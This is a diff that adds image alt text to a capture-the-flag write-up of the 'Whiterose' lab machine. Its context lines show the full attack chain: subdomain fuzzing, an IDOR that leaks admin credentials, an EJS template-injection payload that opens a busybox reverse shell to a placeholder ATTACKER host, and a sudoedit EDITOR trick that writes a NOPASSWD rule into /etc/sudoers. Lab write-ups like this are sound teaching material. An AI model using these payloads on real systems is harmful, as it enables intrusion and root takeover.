@@ -33,7 +33,7 @@ nmap -A -p- TARGET -oN whiterose.nmap --min-rate 10000 -Pn
 | 22       | ssh         |
 | 80       | http        |
 
-![](https://cdn.ziomsec.com/whiterose/1.webp)
+![performing an nmap scan on whiterose machine](https://cdn.ziomsec.com/whiterose/1.webp)
 
 I also saved the credentials that were given to me by the creator.
 
@@ -47,7 +47,7 @@ Since the **nmap** scan revealed port 80 to be running, I tried to access it thr
 
 I then tried accessing the website.
 
-![](https://cdn.ziomsec.com/whiterose/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/whiterose/2.webp)
 
 The home page revealed nothing interesting, so I tried brute forcing available subdomains.
 
@@ -55,7 +55,7 @@ The home page revealed nothing interesting, so I tried brute forcing available s
 ffuf -u http://cyprusbank.thm -H 'Host: FUZZ.cyprusbank.thm' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 1
 ```
 
-![](https://cdn.ziomsec.com/whiterose/3.webp)
+![finding subdomains using ffuf](https://cdn.ziomsec.com/whiterose/3.webp)
 
 **Note** : *I initially tried fuzzing subdomains using `FUZZ.cyprus.thm` as the target without specifying the `Host` header but this didn't work. So I looked around on the internet and found a better way of performing subdomain fuzzing. Here's a breakdown simple explanation and purpose of the above command:*
 - *The `/etc/hosts` entry maps the IP to a particular domain. This IP is only mapped to that particular domain and not to any subdomains related to it unless explicitly mentioned.*
@@ -67,37 +67,37 @@ After finding a subdomain, I mapped it in the `/etc/hosts` file.
 
 I navigated to the **admin** panel that I had discovered and tried logging in using the credentials that I had been given at the start.
 
-![](https://cdn.ziomsec.com/whiterose/4.webp)
+![accessing to the admin panel](https://cdn.ziomsec.com/whiterose/4.webp)
 
 I logged in as **Olivia** and was able to view information about customers and their transactions.
 
-![](https://cdn.ziomsec.com/whiterose/5.webp)
+![accessing the application as Olivia](https://cdn.ziomsec.com/whiterose/5.webp)
 
 I looked in the *Messages* tab and found a bunch of messages.
 
-![](https://cdn.ziomsec.com/whiterose/6.webp)
+![viewing messages](https://cdn.ziomsec.com/whiterose/6.webp)
 
 From the url, I found that the page displayed messages based on the parameter **`c`**. So I tried changing its value to view more messages. On `c=10`, I found the credentials of the privileged admin account.
 
-![](https://cdn.ziomsec.com/whiterose/7.webp)
+![exploiting IDOR to find credentials](https://cdn.ziomsec.com/whiterose/7.webp)
 
 I used these credentials to log in as a privileged user. Now I could view information that was hidden from **Olivia**.
 
-![](https://cdn.ziomsec.com/whiterose/8.webp)
+![logging in as a privileged user](https://cdn.ziomsec.com/whiterose/8.webp)
 
 I visited the *Settings* tab and found an option to change user passwords. I tried changing password of **Terry Colby**.
 
-![](https://cdn.ziomsec.com/whiterose/9.webp)
+![attempting to change user password](https://cdn.ziomsec.com/whiterose/9.webp)
 
 However, it didn't actually work. I couldn't log in as **Terry** with the new password. So I sent another request and analyzed it on **Burp Suite**.
 
-![](https://cdn.ziomsec.com/whiterose/10.webp)
+![analyzing the request on Burp](https://cdn.ziomsec.com/whiterose/10.webp)
 
 I analyzed the application behavior for different password values. I tested for SQL injection and empty password field but got no response in return.
 
 However, when I removed the **password** field altogether, I received an error that revealed backend information.
 
-![](https://cdn.ziomsec.com/whiterose/11.webp)
+![getting a stack error revealing backend information](https://cdn.ziomsec.com/whiterose/11.webp)
 
  The error message specified `settings.ejs`. I did not know much about `ejs` so I asked **chatgpt**.
 
@@ -112,7 +112,7 @@ http://TARGET/page?id=2&settings[view options][outputFunctionName]=x;process.mai
 
 I appended the payload to my request and forwarded it. However, the **nc** version on the server did not support the `-e` argument.
 
-![](https://cdn.ziomsec.com/whiterose/12.webp)
+![adding a payload for a reverse shell](https://cdn.ziomsec.com/whiterose/12.webp)
 
 Since, normal `nc` didn't work, I visited **revshells** to look for other ways. The `busybox` payload worked.
 - https://www.revshells.com
@@ -121,11 +121,11 @@ Since, normal `nc` didn't work, I visited **revshells** to look for other ways. 
 http://TARGET/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox ns ATTACKER 1234 -e /bin/bash');s
 ```
 
-![](https://cdn.ziomsec.com/whiterose/13.webp)
+![triggering the reverse shell payload](https://cdn.ziomsec.com/whiterose/13.webp)
 
 Before forwarding the payload, I had started a reverse shell listener. Upon execution, I received a reverse shell.
 
-![](https://cdn.ziomsec.com/whiterose/14.webp)
+![getting a reverse shell](https://cdn.ziomsec.com/whiterose/14.webp)
 
 I found the first flag in the *web* user's `home` directory.
 
@@ -133,7 +133,7 @@ I found the first flag in the *web* user's `home` directory.
 cat /home/web/user.txt
 ```
 
-![](https://cdn.ziomsec.com/whiterose/15.webp)
+![capturing the user flag](https://cdn.ziomsec.com/whiterose/15.webp)
 
 ## Privilege Escalation
 
@@ -143,7 +143,7 @@ I listed the **sudo** privileges of the user and found it could edit a configura
 sudo -l
 ```
 
-![](https://cdn.ziomsec.com/whiterose/16.webp)
+![listing the sudo privileges](https://cdn.ziomsec.com/whiterose/16.webp)
 
 > The shell was super buggy and unstable, so I spawned a more robust shell using the following steps:
 > - background current session using `ctrl+z`
@@ -160,9 +160,9 @@ Hence I followed the steps to set **vim** as the default editor for **/etc/sudoe
 export EDITOR="vim -- /etc/sudoers"
 ```
 
-![](https://cdn.ziomsec.com/whiterose/17.webp)
+![setting vim as the default editor for sudoers file](https://cdn.ziomsec.com/whiterose/17.webp)
 
-![](https://cdn.ziomsec.com/whiterose/18.webp)
+![setting vim as the default editor for sudoers file](https://cdn.ziomsec.com/whiterose/18.webp)
 
 I then executed the available command.
 
@@ -170,7 +170,7 @@ I then executed the available command.
 sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
 ```
 
-![](https://cdn.ziomsec.com/whiterose/19.webp)
+![executing the allowed sudo command](https://cdn.ziomsec.com/whiterose/19.webp)
 
 This opened the **/etc/sudoers** file in **vim** editor. I simply allowed my user to execute all commands without a password similar to the **root** by adding the below statement.
 
@@ -178,7 +178,7 @@ This opened the **/etc/sudoers** file in **vim** editor. I simply allowed my use
 web ALL=(ALL:ALL) NOPASSWD: ALL
 ```
 
-![](https://cdn.ziomsec.com/whiterose/20.webp)
+![allowing user to execute all commands without password](https://cdn.ziomsec.com/whiterose/20.webp)
 
 Finally, I switched user using **sudo** to become **root** and captured the final flag from the **`/root`** directory.
 
@@ -186,7 +186,7 @@ Finally, I switched user using **sudo** to become **root** and captured the fina
 cat /root/root.txt
 ```
 
-![](https://cdn.ziomsec.com/whiterose/21.webp)
+![capturing the root flag](https://cdn.ziomsec.com/whiterose/21.webp)
 
 That's it from my side! Until next time :)
 
